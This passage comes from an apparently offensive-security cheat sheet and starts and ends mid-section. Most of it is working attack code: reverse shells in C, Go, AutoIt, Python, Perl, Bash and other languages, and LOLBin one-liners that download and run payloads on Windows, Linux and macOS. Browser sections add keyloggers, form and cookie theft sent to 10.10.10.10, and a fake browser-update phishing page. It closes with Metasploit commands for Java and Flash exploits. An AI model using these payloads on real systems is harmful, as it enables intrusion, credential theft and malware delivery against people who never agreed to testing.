    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("10.10.10.10");
    server.sin_port = htons(4444);
    
    WSAConnect(s, (struct sockaddr *)&server, sizeof(server), NULL, NULL, NULL, NULL);
    
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
    
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    closesocket(s);
    WSACleanup();
    return 0;
}
EOF

# Compile on Linux for Windows (using MinGW)
i686-w64-mingw32-gcc reverse_shell.c -o payload.exe -lws2_32

# Compile for 64-bit Windows
x86_64-w64-mingw32-gcc reverse_shell.c -o payload64.exe -lws2_32 -mwindows

# Strip debug symbols
strip payload.exe
```

**Donut - Shellcode Generator**

```bash
# Install Donut
git clone https://github.com/TheWover/donut
cd donut
make

# Generate shellcode from .NET assembly
./donut -a 2 -f payload.exe -o payload.bin

# Generate shellcode with parameters
./donut -a 2 -f payload.exe -p "arg1 arg2" -o payload.bin

# Inject into template
cat payload.bin | xxd -i > shellcode.c
```

**PE Injection Techniques**

```bash
# Cave injection using Backdoor Factory
git clone https://github.com/secretsquirrel/the-backdoor-factory
cd the-backdoor-factory

python backdoor.py -f legitimate.exe -s reverse_shell_tcp_inline -H 10.10.10.10 -P 4444 -o backdoored.exe

# Process hollowing payload generation
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f c -o shellcode.c

# Compile with process hollowing stub (requires custom C code)
```

**Hyperion - PE Crypter**

```bash
# Download Hyperion
wget https://github.com/nullsecuritynet/tools/raw/main/binary/hyperion/release/Hyperion-2.3.1.zip
unzip Hyperion-2.3.1.zip

# Encrypt executable (Windows tool)
wine Hyperion.exe payload.exe encrypted_payload.exe

# [Unverified] Detection rates vary based on AV engine version
```

**AutoIt Script Compilation**

```autoit
; reverse_shell.au3
$socket = TCPConnect("10.10.10.10", 4444)
If @error Then Exit

While 1
    $recv = TCPRecv($socket, 4096)
    If $recv <> "" Then
        $output = RunWait(@ComSpec & " /c " & $recv, "", @SW_HIDE, $STDERR_CHILD + $STDOUT_CHILD)
        TCPSend($socket, $output)
    EndIf
WEnd
```

```bash
# Compile AutoIt script (Windows)
Aut2exe.exe /in reverse_shell.au3 /out payload.exe /icon legitimate.ico

# Or use online compiler
```

**Golang Cross-Compilation**

```go
// reverse_shell.go
package main

import (
    "net"
    "os/exec"
)

func main() {
    conn, _ := net.Dial("tcp", "10.10.10.10:4444")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()
}
```

```bash
# Compile for Windows from Linux
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o payload.exe reverse_shell.go

# Compile for Linux
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o payload.elf reverse_shell.go

# Strip and compress with UPX
upx --brute payload.exe
```

**Self-Extracting Archives**

```bash
# Create SFX with WinRAR (Windows)
WinRAR a -sfx payload.exe files_to_extract/

# Create with 7-Zip
7z a -sfx payload.exe malicious_file.exe

# Add silent extraction parameter
# Create config.txt:
cat > config.txt << 'EOF'
;!@Install@!UTF-8!
RunProgram="malicious_file.exe"
;!@InstallEnd@!
EOF

# Combine
copy /b 7zSD.sfx + config.txt + archive.7z payload.exe
```

**DLL Sideloading**

```bash
# Generate malicious DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o malicious.dll

# Identify DLL hijacking opportunities
# Use Process Monitor to identify missing DLLs loaded by legitimate applications

# Place malicious DLL with same name in application directory
# [Inference] Requires knowledge of application's DLL search order
```

---

### Living-off-the-land techniques

Living-off-the-land (LOLBins/LOLBas) leverages legitimate system binaries and tools to execute malicious code, reducing detection likelihood.

**PowerShell-Based LOL Techniques**

```powershell
# Download and execute payload
powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/payload.ps1')"

# Base64 encoded command
$command = "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/p.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand

# Download file without PowerShell keyword
pwsh.exe -c "Invoke-WebRequest -Uri 'http://10.10.10.10/payload.exe' -OutFile 'C:\Windows\Temp\p.exe'"

# Fileless execution from registry
reg add "HKCU\Software\Classes\test" /v payload /t REG_SZ /d "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/p.ps1')"
powershell.exe -c "IEX (Get-ItemProperty HKCU:\Software\Classes\test).payload"
```

**Certutil - File Download**

```cmd
# Download file disguised as certificate operation
certutil.exe -urlcache -split -f http://10.10.10.10/payload.exe C:\Windows\Temp\payload.exe

# Decode base64 file
certutil.exe -decode encoded.txt decoded.exe

# Encode payload to base64 (on attacker machine)
certutil.exe -encode payload.exe encoded.txt

# Alternative syntax
certutil.exe -f -split http://10.10.10.10/payload.exe payload.exe
```

**BITSAdmin - Background Transfer**

```cmd
# Download file using BITS
bitsadmin /transfer mydownload /download /priority high http://10.10.10.10/payload.exe C:\Windows\Temp\payload.exe

# More stealthy variant
bitsadmin /create backdoor
bitsadmin /addfile backdoor http://10.10.10.10/payload.exe C:\Users\Public\payload.exe
bitsadmin /resume backdoor
bitsadmin /complete backdoor
```

**Regsvr32 - Application Whitelisting Bypass**

```cmd
# Execute remote SCT file
regsvr32.exe /s /n /u /i:http://10.10.10.10/payload.sct scrobj.dll

# Local SCT file
regsvr32.exe /s /u /n /i:payload.sct scrobj.dll
```

```xml
<!-- payload.sct -->
<?XML version="1.0"?>
<scriptlet>
<registration
    progid="TESTING"
    classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
    <script language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/payload.ps1')");
        ]]>
    </script>
</registration>
</scriptlet>
```

**Mshta - HTML Application Execution**

```cmd
# Execute remote HTA
mshta.exe http://10.10.10.10/payload.hta

# Execute inline HTA
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/p.ps1')"":close")

# JavaScript variant
mshta.exe javascript:a=GetObject("script:http://10.10.10.10/payload.sct").Exec();close();
```

**Rundll32 - DLL Execution**

```cmd
# Execute JavaScript via rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/p.ps1')")

# Execute DLL export
rundll32.exe payload.dll,EntryPoint

# Execute remote payload
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc.exe\");window.close()");
```

**Msiexec - MSI Package Execution**

```cmd
# Execute remote MSI
msiexec /q /i http://10.10.10.10/payload.msi

# Silent installation
msiexec /quiet /i payload.msi

# Generate malicious MSI with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o payload.msi
```

**Wmic - WMI Command Execution**

```cmd
# Execute remote XSL script
wmic process get brief /format:"http://10.10.10.10/payload.xsl"

# Local XSL execution
wmic os get /format:"payload.xsl"

# Execute process
wmic process call create "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/p.ps1')"
```

```xml
<!-- payload.xsl -->
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</ms:script>
</stylesheet>
```

**Forfiles - Command Execution**

```cmd
# Execute command for each file
forfiles /p c:\windows\system32 /m notepad.exe /c "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/p.ps1')"

# Alternative execution
forfiles /p c:\windows\system32 /m cmd.exe /c "cmd /c calc.exe"
```

**Pcalua - Program Compatibility Assistant**

```cmd
# Execute arbitrary executable
pcalua.exe -a payload.exe

# Execute with arguments
pcalua.exe -a C:\Windows\System32\cmd.exe -c "/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/p.ps1')"
```

**Mavinject - DLL Injection**

```cmd
# Inject DLL into process
mavinject.exe <PID> /INJECTRUNNING C:\path\to\payload.dll

# Example with explorer.exe
mavinject.exe 1234 /INJECTRUNNING C:\Windows\Temp\malicious.dll
```

**InstallUtil - .NET Bypass**

```cmd
# Execute .NET assembly
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# [Inference] Requires payload to be compiled as .NET assembly with proper Installer class
```

```csharp
// Malicious .NET assembly for InstallUtil
using System;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class Program
{
    public static void Main()
    {
        // Normal execution path
    }
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        // Malicious code executed during uninstall
        Process.Start("powershell.exe", "-nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/p.ps1')");
    }
}
```

**Regasm/Regsvcs - .NET Registration**

```cmd
# Execute .NET assembly via COM registration
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U payload.dll

# Using regsvcs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe payload.dll
```

**MSBuild - Inline C# Execution**

```cmd
# Execute malicious MSBuild project file
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.xml
```

```xml
<!-- payload.xml -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using System.Net;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;
          
          public class ClassExample : Task, ITask
          {
            public override bool Execute()
            {
              WebClient wc = new WebClient();
              string result = wc.DownloadString("http://10.10.10.10/payload.ps1");
              // Execute downloaded payload
              return true;
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

**Cscript/Wscript - Script Execution**

```cmd
# Execute VBScript
cscript.exe payload.vbs
wscript.exe payload.vbs

# Download and execute via VBScript
cscript.exe //E:VBScript //b payload.txt
```

```vbscript
' payload.vbs
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/p.ps1')", 0, False
```

**Odbcconf - DLL Execution**

```cmd
# Execute DLL via ODBC configuration
odbcconf.exe /a {REGSVR C:\path\to\payload.dll}

# Silent execution
odbcconf.exe /s /a {REGSVR payload.dll}
```

**Dfsvc - ClickOnce Application Deployment**

```cmd
# Deploy and execute ClickOnce application
dfsvc.exe http://10.10.10.10/payload.application
```

**Desktopimgdownldr - Image Download**

```cmd
# Download arbitrary file (masquerading as lockscreen image)
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://10.10.10.10/payload.exe /eventName:desktopimgdownldr

# [Unverified] May require specific Windows 10 versions
```

**Ieexec - IE Execution**

```cmd
# Execute .NET application from URL
ieexec.exe http://10.10.10.10/payload.exe
```

**Presentationhost - XAML Browser Application**

```cmd
# Execute XBAP application
presentationhost.exe http://10.10.10.10/payload.xbap

# Local execution
presentationhost.exe payload.xbap
```

**SyncAppvPublishingServer - App-V Package Sync**

```powershell
# Execute PowerShell during App-V sync
SyncAppvPublishingServer.exe "n; IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/p.ps1')"
```

**ProtocolHandlers - Custom URI Schemes**

```cmd
# ms-settings URI handler
start ms-settings:

# Create custom protocol handler in registry for execution
reg add "HKCU\Software\Classes\payload" /ve /d "URL:payload Protocol" /f
reg add "HKCU\Software\Classes\payload" /v "URL Protocol" /f
reg add "HKCU\Software\Classes\payload\shell\open\command" /ve /d "cmd.exe /c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/p.ps1')" /f

# Trigger via browser
start payload://
```

**Linux Living-Off-The-Land Binaries**

```bash
# Curl download and execute
curl http://10.10.10.10/payload.sh | bash

# Wget download and execute
wget -qO- http://10.10.10.10/payload.sh | bash

# Download with curl to file
curl http://10.10.10.10/payload -o /tmp/payload && chmod +x /tmp/payload && /tmp/payload

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl reverse shell
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Bash TCP redirect
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

# Netcat traditional
nc -e /bin/sh 10.10.10.10 4444

# Netcat without -e flag
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f

# OpenSSL reverse shell
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.10:4444 > /tmp/s; rm /tmp/s

# Socat reverse shell
socat tcp-connect:10.10.10.10:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane

# Awk reverse shell
awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

**GTFOBins - Privilege Escalation & Execution**

```bash
# Vim command execution
vim -c ':!bash'
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

# Find command execution
find / -name test -exec /bin/bash \;

# Awk privilege escalation (if SUID)
awk 'BEGIN {system("/bin/sh")}'

# Docker escape
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Python library hijacking
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > /tmp/exploit.py
python -c 'import sys; sys.path.insert(0, "/tmp"); import exploit'

# Tar wildcard exploitation
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar *

# Man command execution
man -P /bin/bash man

# Less/More privilege escalation
less /etc/hosts
!/bin/bash

# systemctl privilege escalation (if SUID)
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
```

**macOS Living-Off-The-Land**

```bash
# LaunchAgent persistence
cat > ~/Library/LaunchAgents/com.malicious.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.malicious</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>bash -i >& /dev/tcp/10.10.10.10/4444 0>&1</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF
launchctl load ~/Library/LaunchAgents/com.malicious.plist

# osascript execution
osascript -e 'do shell script "curl http://10.10.10.10/payload.sh | bash"'

# Python framework
/System/Library/Frameworks/Python.framework/Versions/Current/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**LOLBas Resources**

```bash
# LOLBAS Project (Windows)
# https://lolbas-project.github.io/

# GTFOBins (Linux/Unix)
# https://gtfobins.github.io/

# WADComs (Active Directory)
# https://wadcoms.github.io/
```

---

### Browser exploitation

Browser exploitation targets vulnerabilities in web browsers or their rendering engines to achieve code execution on the target system.

**Metasploit Browser Exploits**

```bash
# List browser exploits
msfconsole -q
search type:exploit platform:windows browser

# Internet Explorer exploits
use exploit/windows/browser/ie_execcommand_uaf
set SRVHOST 0.0.0.0
set SRVPORT 8080
set URIPATH /
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit

# Firefox exploits
use exploit/multi/browser/firefox_proto_crmfrequest
set SRVHOST 0.0.0.0
set SRVPORT 8080
set PAYLOAD firefox/shell_reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit

# Chrome exploits [Unverified] - Public Chrome exploits are rare
use exploit/multi/browser/chrome_cve_2019_5786
set SRVHOST 0.0.0.0
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
exploit
```

**BeEF (Browser Exploitation Framework)**

```bash
# Install BeEF
apt-get install beef-xss
# Or from GitHub
git clone https://github.com/beefproject/beef
cd beef
./install

# Start BeEF
./beef

# Access interface at http://127.0.0.1:3000/ui/panel
# Default credentials: beef:beef

# Hook browser with JavaScript
<script src="http://10.10.10.10:3000/hook.js"></script>

# Inject hook via XSS
http://vulnerable-site.com/page?param=<script src="http://10.10.10.10:3000/hook.js"></script>
```

**BeEF Module Examples**

```bash
# Within BeEF interface, select hooked browser and run modules:

# Information gathering
- Get Visited URLs
- Detect Software
- Get Cookie
- Get Local Storage
- Detect Browsers
- Fingerprint Network

# Social engineering
- Pretty Theft
- Simple Hijacker
- Fake Notification Bar
- Clippy

# Exploitation
- Browser Autopwn (attempts multiple exploits)
- Create Alert Dialog
- Redirect Browser
- Create Pop Under
- Replace Videos

# Persistence
- Confirm Close Tab
- Create Pop Under
- Man-In-The-Browser

# Network attacks
- Internal Network Fingerprinting
- Ping Sweep
- Port Scanner

# Advanced
- Inter-protocol Exploitation
- HTTPS Redirect
```

**Browser Autopwn**

```bash
# Metasploit Browser Autopwn
use auxiliary/server/browser_autopwn2
set SRVHOST 0.0.0.0
set SRVPORT 8080
set URIPATH /
exploit

# [Inference] Automatically serves multiple browser exploits based on detected browser/OS
# Victims redirected to http://10.10.10.10:8080/ will be fingerprinted and served appropriate exploit
```

**Malicious JavaScript Payloads**

```javascript
// Browser fingerprinting
var browserInfo = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    cookieEnabled: navigator.cookieEnabled,
    plugins: Array.from(navigator.plugins).map(p => p.name),
    screen: {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth
    }
};

// Send to attacker server
fetch('http://10.10.10.10/collect', {
    method: 'POST',
    body: JSON.stringify(browserInfo)
});

// Download and execute (Windows-specific)
var x = new ActiveXObject("Microsoft.XMLHTTP");
x.open("GET", "http://10.10.10.10/payload.exe", false);
x.send();
var s = new ActiveXObject("ADODB.Stream");
s.type = 1;
s.open();
s.write(x.responseBody);
s.saveToFile("C:\\Users\\Public\\payload.exe", 2);
s.close();
var r = new ActiveXObject("WScript.Shell").Run("C:\\Users\\Public\\payload.exe");

// Keylogger
document.addEventListener('keypress', function(e) {
    fetch('http://10.10.10.10/keys?k=' + e.key);
});

// Form hijacking
document.querySelectorAll('form').forEach(form => {
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        var formData = new FormData(form);
        fetch('http://10.10.10.10/creds', {
            method: 'POST',
            body: formData
        });
        form.submit();
    });
});
```

**Cross-Site Scripting (XSS) to RCE**

```javascript
// Reflected XSS payload for browser exploitation
<script>
var iframe = document.createElement('iframe');
iframe.src = 'http://10.10.10.10:3000/hook.js';
iframe.style.display = 'none';
document.body.appendChild(iframe);
</script>

// Stored XSS with BeEF hook
<img src=x onerror="var s=document.createElement('script');s.src='http://10.10.10.10:3000/hook.js';document.head.appendChild(s);">

// DOM-based XSS
<script>eval(atob('dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly8xMC4xMC4xMC4xMDozMDAwL2hvb2suanMnO2RvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQocyk7'));</script>
```

**Watering Hole Attacks**

```bash
# Inject malicious iframe into compromised legitimate website
<iframe src="http://10.10.10.10:8080/autopwn" width="0" height="0" style="display:none;"></iframe>

# JavaScript injection
<script src="http://10.10.10.10/malicious.js"></script>

# Serve exploit from compromised site
# Configure Metasploit Browser Autopwn as shown above
# Inject reference to exploit server in legitimate site
```

**Drive-by Download**

```html
<!-- Automatic download via hidden iframe -->
<iframe src="http://10.10.10.10/payload.exe" style="display:none;"></iframe>

<!-- Download attribute forcing download -->
<a href="http://10.10.10.10/payload.exe" download="document.pdf" id="autoclick">Click Here</a>
<script>document.getElementById('autoclick').click();</script>

<!-- META refresh redirect -->
<meta http-equiv="refresh" content="0;url=http://10.10.10.10:8080/autopwn">
```

**Phishing with Browser Exploitation**

```html
<!-- Fake update page -->
<!DOCTYPE html>
<html>
<head>
    <title>Browser Update Required</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        .update-box { background: #f0f0f0; padding: 30px; border-radius: 10px; max-width: 500px; margin: auto; }
        .btn { background: #0078d4; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>
    <div class="update-box">
        <h2>Browser Update Required</h2>
        <p>Your browser is out of date and requires a security update.</p>
        <a href="http://10.10.10.10/payload.exe" download="browser_update.exe">
            <button class="btn">Download Update</button>
        </a>
    </div>
    <script src="http://10.10.10.10:3000/hook.js"></script>
</body>
</html>
```

**HTTPS Downgrade Attacks**

```bash
# SSLstrip (forces HTTP connections)
apt-get install sslstrip
echo 1 > /proc/sys/net/ipv4/ip_forward

# Setup iptables redirect
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Run SSLstrip
sslstrip -l 8080

# Combined with ARP spoofing
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# [Inference] HSTS preload lists and modern browsers reduce effectiveness
```

**Man-in-the-Browser (MITB)**

```javascript
// Inject into hooked browser to intercept form data
(function() {
    var originalSubmit = HTMLFormElement.prototype.submit;
    HTMLFormElement.prototype.submit = function() {
        var formData = {};
        Array.from(this.elements).forEach(function(element) {
            if (element.name) {
                formData[element.name] = element.value;
            }
        });
        
        // Send to attacker
        fetch('http://10.10.10.10/intercept', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(formData)
        });
        
        // Continue normal submission
        return originalSubmit.apply(this, arguments);
    };
})();

// XMLHttpRequest interception
(function() {
    var originalOpen = XMLHttpRequest.prototype.open;
    var originalSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function(method, url) {
        this._url = url;
        return originalOpen.apply(this, arguments);
    };
    
    XMLHttpRequest.prototype.send = function(data) {
        fetch('http://10.10.10.10/xhr', {
            method: 'POST',
            body: JSON.stringify({url: this._url, data: data})
        });
        return originalSend.apply(this, arguments);
    };
})();
```

**Browser Extension Exploitation**

```bash
# Malicious Chrome extension manifest.json
cat > manifest.json << 'EOF'
{
    "manifest_version": 3,
    "name": "Legitimate Extension",
    "version": "1.0",
    "permissions": ["activeTab", "storage", "cookies", "webRequest"],
    "host_permissions": ["<all_urls>"],
    "background": {
        "service_worker": "background.js"
    },
    "content_scripts": [{
        "matches": ["<all_urls>"],
        "js": ["content.js"]
    }]
}
EOF

# background.js - Exfiltrate data
chrome.cookies.getAll({}, function(cookies) {
    fetch('http://10.10.10.10/cookies', {
        method: 'POST',
        body: JSON.stringify(cookies)
    });
});

# content.js - Keylogger
document.addEventListener('keypress', function(e) {
    chrome.runtime.sendMessage({type: 'keypress', key: e.key});
});
```

**WebRTC IP Leak Exploitation**

```javascript
// Discover victim's real IP address (bypasses VPN)
var RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;

if (RTCPeerConnection) {
    var pc = new RTCPeerConnection({iceServers: []});
    pc.createDataChannel('');
    pc.createOffer().then(offer => pc.setLocalDescription(offer));
    
    pc.onicecandidate = function(ice) {
        if (!ice || !ice.candidate || !ice.candidate.candidate) return;
        var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
        var ipMatch = ipRegex.exec(ice.candidate.candidate);
        if (ipMatch) {
            fetch('http://10.10.10.10/ip?addr=' + ipMatch[1]);
        }
    };
}
```

**Cross-Origin Resource Sharing (CORS) Misconfiguration**

```javascript
// Exploit CORS misconfiguration to steal data
fetch('https://vulnerable-site.com/api/user/data', {
    credentials: 'include'
})
.then(response => response.json())
.then(data => {
    fetch('http://10.10.10.10/exfil', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
```

**Listener Setup for Browser Exploitation**

```bash
# Metasploit handler for browser exploits
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; exploit -j"

# Python HTTP server for payload hosting
python3 -m http.server 8080

# BeEF server
cd /opt/beef
./beef
```

---

### Plugin vulnerabilities (Java, Flash)

Browser plugins historically provided significant attack surface. While Flash is deprecated and Java browser plugins are rare, they remain relevant in legacy environments and CTF scenarios.

**Java Applet Exploitation**

**Metasploit Java Exploits**

```bash
# Java Applet JAX-WS Remote Code Execution
use exploit/multi/browser/java_jre17_jaxws
set SRVHOST 0.0.0.0
set SRVPORT 8080
set URIPATH /
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit

# Java Applet Rhino Script Engine Remote Code Execution
use exploit/multi/browser/java_rhino
set SRVHOST 0.0.0.0
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 10.10.10.10
exploit

# Java Signed Applet Social Engineering
use exploit/multi/browser/java_signed_applet
set SRVHOST 0.0.0.0
set APPLET_NAME "Security Update"
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 10.10.10.10
exploit

# Java Atomic Reference Array Type Violation
use exploit/multi/browser/java_atomicreferencearray
set SRVHOST 0.0.0.0
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 10.10.10.10
exploit
```

**Manual Java Applet Creation**

```java
// MaliciousApplet.java
import java.applet.Applet;
import java.io.*;

public class MaliciousApplet extends Applet {
    public void init() {
        try {
            String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"};
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

```bash
# Compile Java applet
javac MaliciousApplet.java

# Create JAR file
jar cvf malicious.jar MaliciousApplet.class

# Self-sign JAR (for social engineering bypass)
keytool -genkey -alias signApplet -keystore keystore -keypass password -storepass password
jarsigner -keystore keystore -storepass password -keypass password malicious.jar signApplet
```

```html
<!-- Host applet on web page -->
<!DOCTYPE html>
<html>
<head>
    <title>Java Required</title>
</head>
<body>
    <h2>Please enable Java to view this content</h2>
    <applet code="MaliciousApplet.class" archive="malicious.jar" width="1" height="1">
        Your browser does not support Java applets.
    </applet>
</body>
</html>
```

**Java Deserialization Attacks**

```bash
# ysoserial - Java deserialization exploit tool
git clone https://github.com/frohoff/ysoserial
cd ysoserial
mvn package -DskipTests

# Generate payload
java -jar target/ysoserial-*-all.jar CommonsCollections1 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' | base64 -w 0

# Use in Java applet or application that deserializes user input
```

**Adobe Flash Exploitation**

[Unverified] Flash Player reached end-of-life in December 2020, but may still be present in isolated or legacy environments.

**Metasploit Flash Exploits**

```bash
# Adobe Flash Player ByteArray Use After Free
use exploit/multi/browser/adobe_flash_hacking_team_uaf
set SRVHOST 0.0.0.0
set SRVPORT 8080
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit

# Adobe Flash Player Shader Buffer Overflow
use exploit/multi/browser/adobe_flash_shader_drawing_fill
set SRVHOST 0.0.0.0
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
exploit

# Adobe Flash Player Nellymoser Audio Codec Buffer Overflow
use exploit/multi/browser/adobe_flash_nellymoser_bof
set SRVHOST 0.0.0.0
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
exploit

# Adobe Flash Player AVM Verification Logic Array Indexing
use exploit/multi/browser/adobe_flash_opaque_background_uaf
set SRVHOST 0.0.0.0
